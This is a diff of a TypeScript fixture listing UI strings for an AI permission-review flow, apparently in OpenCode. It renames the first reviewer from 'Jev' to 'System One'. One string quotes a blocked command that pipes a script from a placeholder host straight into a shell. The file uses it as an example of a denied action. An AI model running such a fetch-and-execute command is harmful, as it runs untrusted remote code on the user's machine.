@@ -145,7 +145,7 @@ const SCREEN_TEXT: ReadonlyArray<readonly [ScreenName, readonly string[]]> = [
   [
     "handoff-progress",
     [
-      "Reviewing this permission · gpt-6-luna after Jev's escalation · medium",
+      "Reviewing this permission · gpt-6-luna after System One's escalation · medium",
       "git push --force-with-lease origin release/2.4",
     ],
   ],
@@ -154,27 +154,27 @@ const SCREEN_TEXT: ReadonlyArray<readonly [ScreenName, readonly string[]]> = [
     [
       "✓ Review approved · bash · $ rm -rf /tmp/scratch-cache",
       "jev-1.13.0 — Narrowly scoped temp cleanup",
-      "gpt-6-luna after Jev's escalation — The user asked",
+      "gpt-6-luna after System One's escalation — The user asked",
       "✕ Review blocked · bash · $ curl -fsS https://setup.invalid | sh",
-      "gpt-6-luna confirmed Jev's denial — Pipes a remote script",
+      "gpt-6-luna confirmed System One's denial — Pipes a remote script",
     ],
   ],
   [
     "v1-overlay-handoff",
     [
-      "gpt-6-luna · reasoning medium · after Jev failed (timeout)",
+      "gpt-6-luna · reasoning medium · after System One failed (timeout)",
       "No action needed",
     ],
   ],
   [
     "result-triggers",
     [
-      "gpt-6-luna after Jev's uncertain approval",
-      "gpt-6-luna after a safety gate stopped Jev's approval",
-      "gpt-6-luna after Jev's invalid response",
-      "gpt-6-luna after Jev failed (timeout)",
-      "gpt-6-luna overturned Jev's denial",
-      "gpt-6-luna confirmed Jev's denial",
+      "gpt-6-luna after System One's uncertain approval",
+      "gpt-6-luna after a safety gate stopped System One's approval",
+      "gpt-6-luna after System One's invalid response",
+      "gpt-6-luna after System One failed (timeout)",
+      "gpt-6-luna overturned System One's denial",
+      "gpt-6-luna confirmed System One's denial",
       "Review blocked (fail-closed)",
     ],
   ],
@@ -182,12 +182,12 @@ const SCREEN_TEXT: ReadonlyArray<readonly [ScreenName, readonly string[]]> = [
   [
     "manual-toasts",
     [
-      "gpt-6-luna reviewed this after Jev; it needs your approval: The force-push would rewrite",
+      "gpt-6-luna reviewed this after System One; it needs your approval: The force-push would rewrite",
       "Reasoning reviewer unavailable",
       "gpt-6-luna failed (timeout). This permission needs your approval.",
       "This permission needs your approval.",
-      "No review time left for gpt-6-luna after Jev (Jev escalated).",
-      "No review time left for gpt-6-luna after Jev",
+      "No review time left for gpt-6-luna after System One (System One escalated).",
+      "No review time left for gpt-6-luna after System One",
       "toast, resolution budget-exhausted · OpenCode draws the frame",
       "Manual review required",
       "OpenCode draws the frame",
